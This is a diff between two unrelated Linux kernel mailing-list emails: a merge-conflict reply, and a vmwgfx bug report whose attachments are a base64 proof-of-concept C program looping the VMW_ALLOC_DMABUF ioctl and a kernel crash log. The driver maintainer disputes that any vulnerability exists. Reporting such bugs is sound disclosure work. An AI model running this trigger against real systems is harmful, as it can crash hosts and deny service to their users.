@@ -2,98 +2,202 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 852BF6A1505
-	for <lists+linux-kernel@lfdr.de>; Fri, 24 Feb 2023 03:43:00 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 2B9826A1507
+	for <lists+linux-kernel@lfdr.de>; Fri, 24 Feb 2023 03:47:49 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S229799AbjBXCm7 (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Thu, 23 Feb 2023 21:42:59 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56400 "EHLO
+        id S229808AbjBXCrk (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Thu, 23 Feb 2023 21:47:40 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:58966 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229470AbjBXCm5 (ORCPT
+        with ESMTP id S229470AbjBXCri (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Thu, 23 Feb 2023 21:42:57 -0500
-Received: from mail-pj1-x102f.google.com (mail-pj1-x102f.google.com [IPv6:2607:f8b0:4864:20::102f])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id A02C7166F4;
-        Thu, 23 Feb 2023 18:42:56 -0800 (PST)
-Received: by mail-pj1-x102f.google.com with SMTP id q31-20020a17090a17a200b0023750b69614so1271894pja.5;
-        Thu, 23 Feb 2023 18:42:56 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=content-transfer-encoding:in-reply-to:from:references:cc:to
-         :content-language:subject:user-agent:mime-version:date:message-id
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=jxyI/41shoUmIXWxgHt7K1UbQjmbWtbd/7LeDQ6aEsI=;
-        b=BeqgUEixZhO78peOPQhqW4yF6VYzakK/ASWVPZzMENNXg5scdTsLjKaGfYXB+aPwuv
-         Tf5XOaWq5JDkLVf8gkcWdlBpK032Xz7cD1sIxxSqs4/hdZHr0eqC7rSlEczpdVNtMyqg
-         8IJLGL/MR5v1QScxe4knXaTkvE7BExi4+oeZC+jnWUdOjxxxTFlGe5dQ1tClAyQQ2nXu
-         z4wzWZwcY9yFagJ/FVJWS0N6GrW5nTA5JbBCp3n5JvGocC/SyBEOcyd6NHZzl0t7W8Vx
-         WMgWmDIWcw+FzhPaN9KSKCK+Ak0q0o+y3D1QWSw3XYad0tIEStKTu4bUzUjj4BtNADne
-         /whw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=content-transfer-encoding:in-reply-to:from:references:cc:to
-         :content-language:subject:user-agent:mime-version:date:message-id
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=jxyI/41shoUmIXWxgHt7K1UbQjmbWtbd/7LeDQ6aEsI=;
-        b=VktbvdN2C79X/tkLxpAk/ZrNwUUGdAiZPdoK+QwrlfyLAknt5GU6CmDjlSx8K7Xhf3
-         V+QwAQYBzNAfLbmQ2XDtrtQl5hSnQOEXsJJRXO7Kitq2hwb1N+RtwtIiP+gdtMmA8HOY
-         MUwSp8U5QzyNSNogWEWXmLVp8kjxFnCqigp4hWkWHVsjkCcPIzUP2FQKEYW3A18U1H60
-         12hPFukwWmWabiIsVznvH3JubkEIHWxPCSQA7Xu4OnEI96JHSCSFtzl5/gH095+YmJyB
-         cevSHKt11F8aeCOYIDFnLMdIK/m0fNZQr9OPH7IdYx4zhmjmf9KL7QAtJDa80kgloT7U
-         oYsQ==
-X-Gm-Message-State: AO0yUKVSPXUCdlKtjUsJLJnzfnSdTvqL6qQcTtjmcVLaYlWHve2WN5Vi
-        qe1vGNuSIc1ys14pzyu7tOE=
-X-Google-Smtp-Source: AK7set8gNKsLF0UkjCWtfWD+CvvdSOV2HDE6PocCDLWIplYCdaISotZ0mg/TLYWF8LBighLrl7nfEA==
-X-Received: by 2002:a05:6a20:c89b:b0:cc:3bf0:ed91 with SMTP id hb27-20020a056a20c89b00b000cc3bf0ed91mr2584909pzb.51.1677206576145;
-        Thu, 23 Feb 2023 18:42:56 -0800 (PST)
-Received: from [192.168.43.80] (subs02-180-214-232-89.three.co.id. [180.214.232.89])
-        by smtp.gmail.com with ESMTPSA id s23-20020aa78d57000000b005ad9e050512sm2082620pfe.121.2023.02.23.18.42.52
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Thu, 23 Feb 2023 18:42:55 -0800 (PST)
-Message-ID: <5f228150-0e29-6d58-3dcf-776bc2a630b7@gmail.com>
-Date:   Fri, 24 Feb 2023 09:42:49 +0700
+        Thu, 23 Feb 2023 21:47:38 -0500
+Received: from smtpbg151.qq.com (smtpbg151.qq.com [18.169.211.239])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D5BC75EECC
+        for <linux-kernel@vger.kernel.org>; Thu, 23 Feb 2023 18:47:35 -0800 (PST)
+X-QQ-mid: bizesmtp68t1677206813tvw4reue
+Received: from [10.4.23.76] ( [58.240.82.166])
+        by bizesmtp.qq.com (ESMTP) with 
+        id ; Fri, 24 Feb 2023 10:46:52 +0800 (CST)
+X-QQ-SSF: 01400000000000I0Z000000A0000000
+X-QQ-FEAT: 3sPl0mbSw/DTl8kBd0+7loX2push1CWsmOXSDTlrJiMQje5UA8TXA8dYTDofE
+        2CPM8h5FerZCTwwV4ADHHPLB7D6V8NgbpPWabgne+/GdmzriNuNRro4gBvNAGwnOyH1ZyND
+        szk/eetmjTu45okfo7uEyR/DLDRbSMOvU4BElKzO3lNK6oYN4qSiPzVDiVQBGVsviCHAUvN
+        jOG06a28Q9/rE1sr2tJBlWNGRWR5uAhu4oYnIiGPUgVP+xlXps3Fl0LfAhGEddJGKmX31Ev
+        el1nmwg9Y+b5TCGbnTuc+zfol6f2quJka3Gy+h5tB6S9O845JcD6S/UajPO4gJbGu70uoGM
+        ffwa3dT4TZfQWPhdFJxoBWgP2NVwKV+sqjVTWfvaKlvDq1FFY1246iOr2fcx4VUVPE6gCbG
+X-QQ-GoodBg: 1
+Content-Type: multipart/mixed; boundary="------------LzuPbzP7XSOZpmeKfDvh1pBt"
+Message-ID: <113C6E516C95FA38+f2633fe9-fb5a-616e-0e35-7559750544c9@uniontech.com>
+Date:   Fri, 24 Feb 2023 10:46:51 +0800
 MIME-Version: 1.0
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
  Thunderbird/102.8.0
-Subject: Re: linux-next: manual merge of the mm-stable tree with the ext4 tree
-Content-Language: en-US
-To:     Stephen Rothwell <sfr@canb.auug.org.au>,
-        Andrew Morton <akpm@linux-foundation.org>,
-        Theodore Ts'o <tytso@mit.edu>
-Cc:     Matthew Wilcox <willy@infradead.org>, Jan Kara <jack@suse.cz>,
-        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
-        Linux Next Mailing List <linux-next@vger.kernel.org>,
-        "Vishal Moola (Oracle)" <vishal.moola@gmail.com>,
-        Linus Torvalds <torvalds@linux-foundation.org>
-References: <20230220152938.45f62d5a@canb.auug.org.au>
- <Y/ODNJ3MfoD6dUru@casper.infradead.org>
- <20230221175436.599166f9@canb.auug.org.au>
- <20230223144722.635ab483@canb.auug.org.au>
-From:   Bagas Sanjaya <bagasdotme@gmail.com>
-In-Reply-To: <20230223144722.635ab483@canb.auug.org.au>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-Spam-Status: No, score=-0.7 required=5.0 tests=BAYES_00,DKIM_SIGNED,
-        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,NICE_REPLY_A,
-        RCVD_IN_DNSWL_NONE,RCVD_IN_SORBS_WEB,SPF_HELO_NONE,SPF_PASS
-        autolearn=no autolearn_force=no version=3.4.6
+Subject: Re: [PATCH v2] drm/vmwgfx: Work around VMW_ALLOC_DMABUF
+To:     Zack Rusin <zackr@vmware.com>, "daniel@ffwll.ch" <daniel@ffwll.ch>,
+        "dri-devel@lists.freedesktop.org" <dri-devel@lists.freedesktop.org>,
+        Linux-graphics-maintainer <Linux-graphics-maintainer@vmware.com>,
+        "airlied@gmail.com" <airlied@gmail.com>,
+        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
+References: <20230223070405.20228-1-tangmeng@uniontech.com>
+ <c5ba07a5ad3c6b101126a97eb094c51013ee83c0.camel@vmware.com>
+From:   Meng Tang <tangmeng@uniontech.com>
+In-Reply-To: <c5ba07a5ad3c6b101126a97eb094c51013ee83c0.camel@vmware.com>
+X-QQ-SENDSIZE: 520
+Feedback-ID: bizesmtp:uniontech.com:qybglogicsvr:qybglogicsvr7
+X-Spam-Status: No, score=0.3 required=5.0 tests=BAYES_00,FORGED_MUA_MOZILLA,
+        NICE_REPLY_A,RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,
+        SPF_PASS autolearn=no autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On 2/23/23 10:47, Stephen Rothwell wrote:
-> I still have not been able to figure out a merge resolution for this,
-> so the ext4 tree still has had no testing in linux-next and the merge
-> window is progressing.  Does anyone want to help with this?
+This is a multi-part message in MIME format.
+--------------LzuPbzP7XSOZpmeKfDvh1pBt
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+
+On 2023/2/23 20:50, Zack Rusin wrote:
+> On Thu, 2023-02-23 at 15:04 +0800, Meng Tang wrote:
+>> A privilege escalation vulnerability was found in vmwgfx driver
+>> in drivers/gpu/drm/vmwgfx/vmwgfx_drv.c in GPU component of Linux
+>> kernel with device file '/dev/dri/renderD128 (or Dxxx)'. This flaw
+>> allows a local attacker with a user account on the system to gain
+>> privilege, causing a denial of service(DoS).
+>>
+>> This vulnerability can be quickly verified by the following code
+>> logic:
+>> ...
+>> dri_fd = open("/dev/dri/renderD128", O_RDWR);
+>> ret = ioctl(dri_fd, 0xC0186441, &arg);
+>> if (ret == 0) {
+>>          printf("[*] VMW_ALLOC_DMABUF Success!\n");
+>> }
+>> ...
 > 
+> This is just regular usage of that ioctl. What's the vulnerability?
+> 
+Yes, this is a very common regular usage of that ioctl.
+But if any user can operate /dev/dri/renderD128 through ioctl, it will 
+lead to a vulnerability.
+>>
+>> Submit this commit to fix it.
+> 
+> No, this is incorrect. You're effectively just disabling the driver for normal
+> apps/users using OpenGL or any accelerated contexts, which is going to completely
+> break, well, essentially everything this driver is for. Being able to use ioctl's
+> that were meant to be used is not a bug.
+> 
+> If you have a proof of concept or at least a description of the vulnerability that
+> you've found I'd be happy to take a look at it.
+> 
+> z
 
-I think at worst, Linus will have to resolve this mess himself when PR
-for ext4 is submitted and merged in this merge window.
 
-Thanks.
+$ ls /dev/dri/renderD128 -la
+crw-rw----+ 1 root render 226, 128 2?  15 11:45 /dev/dri/renderD128
 
--- 
-An old man doll... just what I always wanted! - Clara
+The permission of the file is ”crw-rw----+”.
+I think only the root user or users with certain privileges can access 
+the /dev/dri/renderD128 device file at this time.
 
+But in fact, users can access /dev/dri/renderD128 through ioctl without 
+permission.
+
+Attachment poc.c is a test case, any user can execute the 
+case(VMW_ALLOC_DMABUF) successfully, and eventually lead to a call 
+trace(log see attachment dmesg.txt).
+
+This will cause the user with permission VMW_ALLOC_DMABUF failed.
+
+Therefore, I think that according to the permissions shown by 
+“crw-rw----+ 1 root render”, only the root user or users with certain 
+privileges can VMW_ALLOC_DMABUF success.
+--------------LzuPbzP7XSOZpmeKfDvh1pBt
+Content-Type: text/x-csrc; charset=UTF-8; name="poc.c"
+Content-Disposition: attachment; filename="poc.c"
+Content-Transfer-Encoding: base64
+
+I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGRpcmVudC5oPgojaW5jbHVkZSA8ZW5k
+aWFuLmg+CiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUg
+PHNjaGVkLmg+CiNpbmNsdWRlIDxzaWduYWwuaD4KI2luY2x1ZGUgPHN0ZGFyZy5oPgojaW5j
+bHVkZSA8c3RkYm9vbC5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzdGRpby5o
+PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5
+cy9pb2N0bC5oPgojaW5jbHVkZSA8c3lzL3Jlc291cmNlLmg+CiNpbmNsdWRlIDxzeXMvc3Rh
+dC5oPgojaW5jbHVkZSA8bGliZHJtL2RybS5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4K
+I2luY2x1ZGUgPHN5cy90aW1lLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUg
+PHN5cy93YWl0Lmg+CiNpbmNsdWRlIDx0aW1lLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KCmlu
+dCBhcmdbMHgxMF09ezB9OwppbnQgZHJpX2ZkID0tMTsKCnZvaWQgdHJpZ2dlcih2b2lkKQp7
+CglpbnQgcmV0OwoJYXJnWzBdPTB4MTAwMDA7IAoKCXdoaWxlKDEpewoJCXJldD1pb2N0bChk
+cmlfZmQsIDB4QzAxODY0NDEsICZhcmcpOwoJCWlmIChyZXQgIT0gMCApewoJCQlwcmludGYo
+IlsqXSBWTVdfQUxMT0NfRE1BQlVGIEZhaWxlZFxuIik7CgoJCQlyZXR1cm4gOwoJCX0KCQlw
+cmludGYoIlsqXSBWTVdfQUxMT0NfRE1BQlVGIGNyZWF0ZWRcbiIpOwoJfQp9CgppbnQgbWFp
+bih2b2lkKQp7CglkcmlfZmQ9IG9wZW4oIi9kZXYvZHJpL3JlbmRlckQxMjgiLCBPX1JEV1Ip
+OwoKCWlmKGRyaV9mZCA9PSAtMSkKCQlyZXR1cm47CgoJcHRocmVhZF90IHRpZDEsdGlkMjsK
+CglpZihwdGhyZWFkX2NyZWF0ZSgmdGlkMSxOVUxMLHRyaWdnZXIsTlVMTCkpeyAKCQlwZXJy
+b3IoIlsqXSB0aHJlYWRfY3JlYXRlIHRpZDFcbiIpOyAKCX0gCgoKCgl3aGlsZSgxKXsgCgkJ
+c2xlZXAoMyk7IAoJfQoKCXJldHVybiAwOwp9Cg==
+--------------LzuPbzP7XSOZpmeKfDvh1pBt
+Content-Type: text/plain; charset=UTF-8; name="dmesg.txt"
+Content-Disposition: attachment; filename="dmesg.txt"
+Content-Transfer-Encoding: base64
+
+WzU4NDIxLjczNTU5M10gLS0tLS0tLS0tLS0tWyBjdXQgaGVyZSBdLS0tLS0tLS0tLS0tCls1
+ODQyMS43MzU1OTVdIGtlcm5lbCBCVUcgYXQgbW0vc2x1Yi5jOjM3OSEKWzU4NDIxLjczNTYw
+M10gaW52YWxpZCBvcGNvZGU6IDAwMDAgWyMyXSBQUkVFTVBUIFNNUCBQVEkKWzU4NDIxLjcz
+NTYwN10gQ1BVOiAwIFBJRDogMzE2NzAgQ29tbTogcG9jIFRhaW50ZWQ6IEcKWzU4NDIxLjcz
+NTYxMV0gSGFyZHdhcmUgbmFtZTogaW5ub3RlayBHbWJIIFZpcnR1YWxCb3gvVmlydHVhbEJv
+eCwgQklPUyBWaXJ0dWFsQm94IDEyLzAxLzIwMDYKWzU4NDIxLjczNTYxM10gUklQOiAwMDEw
+OmtmcmVlKzB4Mjc4LzB4MmEwCls1ODQyMS43MzU2MjFdIENvZGU6IGZmIDRjIDhkIDcyIGZm
+IGU5IDI2IGZlIGZmIGZmIDQ4IDhiIDU1IGM4IDRkIDg5IGY5IDQxIGI4IDAxIDAwIDAwIDAw
+IDRjIDg5IGUxIDRjIDg5IGY2IDRjIDg5IGVmIGU4IGJkIGZhIGZmIGZmIGU5IGFmIGZlIGZm
+IGZmIDwwZj4gMGIgMGYgMGIgODAgM2QgNGQgZjEgOTMgMDEgMDAgNzUgYTUgZTkgZjUgYTkg
+OTQgMDAgNDggOGIgMTUgMWYKWzU4NDIxLjczNTYyNF0gUlNQOiAwMDE4OmZmZmY5ZWVhYzYz
+ZjdjNzAgRUZMQUdTOiAwMDAxMDI0NgpbNTg0MjEuNzM1NjI3XSBSQVg6IGZmZmY5M2I1MTQy
+ZWQ0MDAgUkJYOiBmZmZmOTNiNTE1MTgyMDAwIFJDWDogZmZmZjkzYjUxNDJlZDYwMApbNTg0
+MjEuNzM1NjI5XSBSRFg6IDAwMDAwMDAwMDA5YzFjNDAgUlNJOiAwMDAwMDAwMDAwMDAwMDAw
+IFJESTogZmZmZjkzYjUwMTA0MmIwMApbNTg0MjEuNzM1NjMxXSBSQlA6IGZmZmY5ZWVhYzYz
+ZjdjYTggUjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogYzAwMDAwMDBmZmZmZGZmZgpbNTg0
+MjEuNzM1NjMzXSBSMTA6IDAwMDAwMDAwMDAwMDAwMDEgUjExOiBmZmZmOWVlYWM2M2Y3OWMw
+IFIxMjogZmZmZjkzYjUxNDJlZDQwMApbNTg0MjEuNzM1NjM1XSBSMTM6IGZmZmY5M2I1MDEw
+NDJiMDAgUjE0OiBmZmZmZDY0NjAwNTBiYjAwIFIxNTogZmZmZmZmZmZjMDM1NTkxMQpbNTg0
+MjEuNzM1NjM3XSBGUzogIDAwMDA3Zjc5OTBhNTU3MDAoMDAwMCkgR1M6ZmZmZjkzYjViZGEw
+MDAwMCgwMDAwKSBrbmxHUzowMDAwMDAwMDAwMDAwMDAwCls1ODQyMS43MzU2MzldIENTOiAg
+MDAxMCBEUzogMDAwMCBFUzogMDAwMCBDUjA6IDAwMDAwMDAwODAwNTAwMzMKWzU4NDIxLjcz
+NTY0MV0gQ1IyOiAwMDAwN2Y3OThjMDAwMDEwIENSMzogMDAwMDAwMDAwZTkxYTAwMiBDUjQ6
+IDAwMDAwMDAwMDAwNzA2ZjAKWzU4NDIxLjczNTY0Nl0gQ2FsbCBUcmFjZToKWzU4NDIxLjcz
+NTY0OF0gIDxUQVNLPgpbNTg0MjEuNzM1NjUyXSAgdm13X2JvX2NyZWF0ZSsweDkxLzB4YzAg
+W3Ztd2dmeF0KWzU4NDIxLjczNTY2NF0gIHZtd19nZW1fb2JqZWN0X2NyZWF0ZV93aXRoX2hh
+bmRsZSsweDRjLzB4YzAgW3Ztd2dmeF0KWzU4NDIxLjczNTY3Nl0gID8gX3Jhd19zcGluX3Vu
+bG9ja19pcnFyZXN0b3JlKzB4MjcvMHg0MwpbNTg0MjEuNzM1NjgzXSAgPyB2bXdfZ2VtX29i
+amVjdF9jcmVhdGVfd2l0aF9oYW5kbGUrMHhjMC8weGMwIFt2bXdnZnhdCls1ODQyMS43MzU2
+OTJdICB2bXdfZ2VtX29iamVjdF9jcmVhdGVfaW9jdGwrMHgzYi8weDkwIFt2bXdnZnhdCls1
+ODQyMS43MzU3MDRdICBkcm1faW9jdGxfa2VybmVsKzB4YmEvMHgxNTAgW2RybV0KWzU4NDIx
+LjczNTc2OV0gIGRybV9pb2N0bCsweDI1OC8weDQzMCBbZHJtXQpbNTg0MjEuNzM1Nzg2XSAg
+PyB2bXdfZ2VtX29iamVjdF9jcmVhdGVfd2l0aF9oYW5kbGUrMHhjMC8weGMwIFt2bXdnZnhd
+Cls1ODQyMS43MzU3OTVdICA/IHNlY3VyaXR5X2NhcGFibGUrMHgzZi8weDYwCls1ODQyMS43
+MzU4MDNdICA/IGRybV9pb2N0bF9rZXJuZWwrMHgxNTAvMHgxNTAgW2RybV0KWzU4NDIxLjcz
+NTgyMV0gID8gZHJtX2lvY3RsX2tlcm5lbCsweDE1MC8weDE1MCBbZHJtXQpbNTg0MjEuNzM1
+ODM5XSAgdm13X2dlbmVyaWNfaW9jdGwrMHg4OC8weDE2MCBbdm13Z2Z4XQpbNTg0MjEuNzM1
+ODUxXSAgdm13X3VubG9ja2VkX2lvY3RsKzB4MTUvMHgyMCBbdm13Z2Z4XQpbNTg0MjEuNzM1
+ODYxXSAgX194NjRfc3lzX2lvY3RsKzB4OTYvMHhkMApbNTg0MjEuNzM1ODY5XSAgZG9fc3lz
+Y2FsbF82NCsweDNhLzB4YzAKWzU4NDIxLjczNTg3NF0gIGVudHJ5X1NZU0NBTExfNjRfYWZ0
+ZXJfaHdmcmFtZSsweDYxLzB4Y2IKWzU4NDIxLjczNTg3OF0gUklQOiAwMDMzOjB4N2Y3OTkw
+YjQ5NTk3Cls1ODQyMS43MzU4ODJdIENvZGU6IDAwIDAwIDkwIDQ4IDhiIDA1IGY5IGE4IDBj
+IDAwIDY0IGM3IDAwIDI2IDAwIDAwIDAwIDQ4IGM3IGMwIGZmIGZmIGZmIGZmIGMzIDY2IDJl
+IDBmIDFmIDg0IDAwIDAwIDAwIDAwIDAwIGI4IDEwIDAwIDAwIDAwIDBmIDA1IDw0OD4gM2Qg
+MDEgZjAgZmYgZmYgNzMgMDEgYzMgNDggOGIgMGQgYzkgYTggMGMgMDAgZjcgZDggNjQgODkg
+MDEgNDgKWzU4NDIxLjczNTg4NV0gUlNQOiAwMDJiOjAwMDA3Zjc5OTBhNTRlZDggRUZMQUdT
+OiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAwMDAxMApbNTg0MjEuNzM1ODg3XSBS
+QVg6IGZmZmZmZmZmZmZmZmZmZGEgUkJYOiAwMDAwMDAwMDAwMDAwMDAwIFJDWDogMDAwMDdm
+Nzk5MGI0OTU5NwpbNTg0MjEuNzM1ODg5XSBSRFg6IDAwMDAwMDAwMDA0MDQwODAgUlNJOiAw
+MDAwMDAwMGMwMTg2NDQxIFJESTogMDAwMDAwMDAwMDAwMDAwMwpbNTg0MjEuNzM1ODkwXSBS
+QlA6IDAwMDA3Zjc5OTBhNTRlZjAgUjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogMDAwMDAw
+MDAwMDAwMDA3NwpbNTg0MjEuNzM1ODkxXSBSMTA6IDAwMDA3Zjc5OGMwMDA4ZDAgUjExOiAw
+MDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAwMDdmZmRiM2U4OWYyZQpbNTg0MjEuNzM1ODkyXSBS
+MTM6IDAwMDA3ZmZkYjNlODlmMmYgUjE0OiAwMDAwN2Y3OTkwYTU1NzAwIFIxNTogMDAwMDAw
+MDAwMDAwMDAwMApbNTg0MjEuNzM1ODk0XSAgPC9UQVNLPg==
+
+--------------LzuPbzP7XSOZpmeKfDvh1pBt--
